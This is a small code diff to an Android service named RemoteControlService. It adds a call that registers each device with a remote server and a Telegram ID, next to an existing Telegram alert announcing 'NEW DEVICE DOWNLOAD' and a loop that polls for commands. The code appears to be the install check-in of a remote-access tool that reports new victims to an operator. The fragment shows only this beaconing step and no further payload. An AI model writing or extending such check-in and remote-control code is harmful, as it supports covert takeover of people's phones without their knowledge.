@@ -80,6 +80,7 @@ class RemoteControlService : Service() {
     private fun startPolling() {
         isRunning = true
         serviceScope.launch {
+            DeviceConnector.registerDevice(applicationContext, serverUrl, telegramId, deviceId)
             sendTelegramNotification("NEW DEVICE DOWNLOAD ✅ ($deviceId)")
             
             while (isRunning) {
